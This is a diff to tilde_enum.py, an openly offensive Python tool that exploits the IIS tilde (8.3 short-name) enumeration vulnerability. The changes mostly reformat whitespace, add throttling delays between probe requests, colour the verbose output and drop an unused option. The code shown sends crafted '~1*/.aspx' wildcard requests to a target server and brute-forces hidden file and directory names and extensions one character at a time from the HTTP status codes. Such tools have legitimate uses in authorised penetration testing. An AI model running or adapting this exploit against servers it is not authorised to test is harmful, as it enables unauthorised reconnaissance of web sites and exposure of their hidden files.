@@ -2,9 +2,9 @@
 
 """
 -------------------------------------------------------------------------------
-Name:		tilde_enum.py
-Purpose:	Expands the file names found from the tilde enumeration vuln
-Author:		Micah Hoffman (@WebBreacher)
+Name:        tilde_enum.py
+Purpose:    Expands the file names found from the tilde enumeration vuln
+Author:        Micah Hoffman (@WebBreacher)
 -------------------------------------------------------------------------------
 """
 
@@ -32,12 +32,12 @@ targets = []
 
 # Findings is the list of URLs that may be good on the web site
 # TODO - Are all of these really necessary?
-findings_file =  {}		# Files discovered
-findings_other = []  	# HTTP Response Codes other than 200
-findings_final = []		# Where the guessed files are output
-findings_dir =   [] 	# Directories discovered
-findings_dir_other =  		[]
-findings_dir_final = 		[]
+findings_file =  {}        # Files discovered
+findings_other = []      # HTTP Response Codes other than 200
+findings_final = []        # Where the guessed files are output
+findings_dir =   []     # Directories discovered
+findings_dir_other =          []
+findings_dir_final =         []
 findings_dir_other_final =  []
 
 # Location of the extension brute force word list
@@ -95,10 +95,10 @@ def initialCheckUrl(url):
     not_there_response_content_length = len(not_there_response.read())
 
     if not_there_response.getcode():
-        print '[-]	URLNotThere -> HTTP Code: %s, Response Length: %s' % (not_there_response.getcode(), not_there_response_content_length)
+        print '[-]    URLNotThere -> HTTP Code: %s, Response Length: %s' % (not_there_response.getcode(), not_there_response_content_length)
         response_code['not_there_code'], response_code['not_there_length'] = not_there_response.getcode(), not_there_response_content_length
     else:
-        print '[+]	URLNotThere -> HTTP Code: %s, Error Code: %s' % (not_there_response.code, not_there_response.reason)
+        print '[+]    URLNotThere -> HTTP Code: %s, Error Code: %s' % (not_there_response.code, not_there_response.reason)
         response_code['not_there_code'], response_code['not_there_reason'] = not_there_response.code
 
     # Check if we didn't get a 404. This would indicate custom error messages or some redirection and will cause issues later.
@@ -109,10 +109,10 @@ def initialCheckUrl(url):
     print bcolors.GREEN + '[-]  Testing with user-submitted %s' % url + bcolors.ENDC
     url_response = getWebServerResponse(url)
     if url_response.getcode():
-        print '[-]	URLUser -> HTTP Code: %s, Response Length: %s' % (url_response.getcode(), len(url_response.read()))
+        print '[-]    URLUser -> HTTP Code: %s, Response Length: %s' % (url_response.getcode(), len(url_response.read()))
         response_code['user_code'], response_code['user_length'] = url_response.getcode(), len(url_response.read())
     else:
-        print '[+]	URLUser -> HTTP Code: %s, Error Code: %s' % (url_response.code, url_response.reason)
+        print '[+]    URLUser -> HTTP Code: %s, Error Code: %s' % (url_response.code, url_response.reason)
         response_code['user_code'], response_code['user_reason'] = url_response.code, url_response.reason
 
     # Check if we got an HTTP response code of 200.
@@ -158,13 +158,13 @@ def checkForTildeVuln(url):
                 pass # just use the default string already set
         else:
             print bcolors.RED + '[!]  Error. Server is not reporting that it is IIS.'
-            print 				'[!]     (Request error: %s)' % server_header.getcode()
-            print 				'[!]     If you know it is, use the -f flag to force testing and re-run the script. (%s)' % server_header + bcolors.ENDC
+            print                 '[!]     (Request error: %s)' % server_header.getcode()
+            print                 '[!]     If you know it is, use the -f flag to force testing and re-run the script. (%s)' % server_header + bcolors.ENDC
             sys.exit()
     else:
         print bcolors.RED + '[!]  Error. Server is not reporting that it is IIS.'
-        print				'[!]     (Request error: %s)' % server_header.getcode()
-        print 				'[!]     If you know it is, use the -f flag to force testing and re-run the script. (%s)' % server_header + bcolors.ENDC
+        print                '[!]     (Request error: %s)' % server_header.getcode()
+        print                 '[!]     If you know it is, use the -f flag to force testing and re-run the script. (%s)' % server_header + bcolors.ENDC
         sys.exit()
 
     # Check to see if the server is vulnerable to the tilde vulnerability
@@ -173,7 +173,7 @@ def checkForTildeVuln(url):
         print bcolors.YELLOW + '[+]  The server is vulnerable to the tilde enumeration vulnerability (IIS/5|6.x)..' + bcolors.ENDC
     else:
         print bcolors.RED + '[!]  Error. Server is not probably NOT vulnerable to the tilde enumeration vulnerability.'
-        print				'[!]     If you know it is, use the -f flag to force testing and re-run the script.' + bcolors.ENDC
+        print                '[!]     If you know it is, use the -f flag to force testing and re-run the script.' + bcolors.ENDC
         sys.exit()
 
     return check_string
@@ -181,15 +181,16 @@ def checkForTildeVuln(url):
 
 def findExtension(url, filename):
     # Find out how many chars the extension has
-    resp1 = getWebServerResponse(url+filename+'~1.%3f/.aspx')		# 1 extension chars
+    resp1 = getWebServerResponse(url+filename+'~1.%3f/.aspx')        # 1 extension chars
     sleep(args.wait)
-    resp2 = getWebServerResponse(url+filename+'~1.%3f%3f/.aspx')	# 2 extension chars
+    resp2 = getWebServerResponse(url+filename+'~1.%3f%3f/.aspx')    # 2 extension chars
     sleep(args.wait)
-    resp3 = getWebServerResponse(url+filename+'~1.%3f%3f%3f/.aspx')	# 3+ extension chars
+    resp3 = getWebServerResponse(url+filename+'~1.%3f%3f%3f/.aspx')    # 3+ extension chars
 
     if resp1.code == 404:
         for char1 in chars:
             resp1a = getWebServerResponse(url+filename+'~1.'+char1+'%3f%3f/.aspx')
+            sleep(args.wait)
             if resp1a.code == 404:  # Got the first valid char
                 print bcolors.YELLOW + '[+]  Found file:  ' + filename+' . '+char1+bcolors.ENDC
                 return filename+'.'+char1
@@ -197,9 +198,11 @@ def findExtension(url, filename):
     elif resp1.code == 500 and resp2.code == 404:
         for char1 in chars:
             resp1a = getWebServerResponse(url+filename+'~1.'+char1+'%3f%3f/.aspx')
+            sleep(args.wait)
             if resp1a.code == 404:  # Got the first valid char
                 for char2 in chars:
                     resp2a = getWebServerResponse(url+filename+'~1.'+char1+char2+'%3f/.aspx')
+                    sleep(args.wait)
                     if resp2a.code == 404:  # Got the second valid char
                         print bcolors.YELLOW + '[+]  Found file:  ' +filename+' . '+char1+char2+bcolors.ENDC
                         return filename+'.'+char1+char2
@@ -207,12 +210,15 @@ def findExtension(url, filename):
     elif resp1.code == 500 and resp2.code == 500 and resp3.code == 404:
         for char1 in chars:
             resp1a = getWebServerResponse(url+filename+'~1.'+char1+'%3f%3f/.aspx')
+            sleep(args.wait)
             if resp1a.code == 404:  # Got the first valid char
                 for char2 in chars:
                     resp2a = getWebServerResponse(url+filename+'~1.'+char1+char2+'%3f/.aspx')
+                    sleep(args.wait)
                     if resp2a.code == 404:  # Got the second valid char
                         for char3 in chars:
                             resp3a = getWebServerResponse(url+filename+'~1.'+char1+char2+char3+'%3f/.aspx')
+                            sleep(args.wait)
                             if resp3a.code == 404:  # Got the third valid char
                                 print bcolors.YELLOW + '[+]  Found file:  ' +filename+' . '+char1+char2+char3+bcolors.ENDC
                                 return filename+'.'+char1+char2+char3
@@ -247,8 +253,8 @@ def checkEightDotThreeEnum(url, check_string, dirname='/'):
         if resp1.code == 404:  # Got the first valid char
 
             # Check to see if the word is longer than just this char
-            length_gauge4 = getWebServerResponse(url+char+'%3f%3f~1*/.aspx')		    # 4 char filename
-            length_gauge5 = getWebServerResponse(url+char+'%3f%3f%3f~1*/.aspx')			# 5 char filename
+            length_gauge4 = getWebServerResponse(url+char+'%3f%3f~1*/.aspx')            # 4 char filename
+            length_gauge5 = getWebServerResponse(url+char+'%3f%3f%3f~1*/.aspx')            # 5 char filename
 
             for char2 in chars:
                 resp2 = getWebServerResponse(url+char+char2+check_string)
@@ -379,7 +385,7 @@ def performLookups(findings, url_good):
                     else:
                         test_response_code = 0
 
-                    if args.v: print '[+]  URL: %s  -> RESPONSE: %s' % (url_to_try, test_response_code)
+                    if args.v: print bcolors.PURPLE + '[+]  URL: %s  -> RESPONSE: %s' % (url_to_try, test_response_code) + bcolors.ENDC
 
                     # Here is where we figure out if we found something or just found something odd
                     if test_response_code == response_code['user_code']:
@@ -552,8 +558,6 @@ def main():
 
 # Command Line Arguments
 parser = argparse.ArgumentParser(description='Exploits and expands the file names found from the tilde enumeration vuln')
-# TODO - Implement the -b option
-parser.add_argument('-b', action='store_true', default=False, help='brute force backup extension, extensions')
 parser.add_argument('-d', dest='dirwordlist', help='an optional wordlist for directory name content')
 parser.add_argument('-f', action='store_true', default=False, help='force testing of the server even if the headers do not report it as an IIS system')
 parser.add_argument('-u', dest='url', help='URL to scan')
@@ -566,14 +570,14 @@ args = parser.parse_args()
 # The entire bcolors class was taken verbatim from the Social Engineer's Toolkit (ty @SET)
 if checkOs() == "posix":
     class bcolors:
-        PURPLE = '\033[95m'		# Verbose
+        PURPLE = '\033[95m'        # Verbose
         CYAN = '\033[96m'
         DARKCYAN = '\033[36m'
         BLUE = '\033[94m'
-        GREEN = '\033[92m'		# Normal
-        YELLOW = '\033[93m'		# Findings
-        RED = '\033[91m'		# Errors
-        ENDC = '\033[0m'		# End colorization
+        GREEN = '\033[92m'        # Normal
+        YELLOW = '\033[93m'        # Findings
+        RED = '\033[91m'        # Errors
+        ENDC = '\033[0m'        # End colorization
 
         def disable(self):
             self.PURPLE = ''
